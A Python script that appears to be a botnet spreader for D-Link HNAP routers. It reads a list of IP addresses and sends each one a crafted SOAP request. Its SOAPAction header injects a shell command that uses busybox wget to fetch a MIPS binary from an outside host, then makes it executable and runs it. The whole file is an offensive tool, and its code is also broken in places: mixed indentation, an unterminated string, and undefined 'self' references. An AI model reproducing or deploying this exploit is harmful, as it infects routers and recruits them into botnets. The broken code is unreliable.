#! python !#
import threading, sys, time, random, socket, re, os, requests
from Queue import *
from sys import stdout
from threading import Thread


ips = open(sys.argv[1], "r").readlines()
queue = Queue()
queue_count = 0
payload = "<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><AddPortMapping xmlns=\"http://purenetworks.com/HNAP1/\"><PortMappingDescription>foobar</PortMappingDescription><InternalClient>192.168.0.100</InternalClient><PortMappingProtocol>TCP</PortMappingProtocol><ExternalPort>1234</ExternalPort><InternalPort>1234</InternalPort></AddPortMapping></soap:Body></soap:Envelope>"
headerlist = {'SOAPAction': 'http://purenetworks.com/HNAP1/GetDeviceSettings/`cd /tmp; busybox wget http://1.1.1.1/bins/mips; chmod 777 mips; ./mips hnap.exploit`'}

		def hnap(host):
			try:
				print "Loading " + self.ip
				url = "http://" + self.ip + /HNAP1"
				requests.post(url, timeout=5, headers=headerlist, data=payload)

    except:
        pass
    return

def main():
    global queue_count
    for line in ips:
        line = line.strip("\r")
        line = line.strip("\n")
        queue_count += 1
        sys.stdout.write("\r[%d] Added to queue" % (queue_count))
        sys.stdout.flush()
        queue.put(line)
    sys.stdout.write("\n")
    i = 0
    while i != queue_count:
        i += 1
        try:
            input = queue.get()
            thread = Thread(target=hnap, args=(input,))
            thread.start()
        except KeyboardInterrupt:
            sys.exit("Interrupted? (ctrl + c)")
    thread.join()
    return

if __name__ == "__main__":
    main()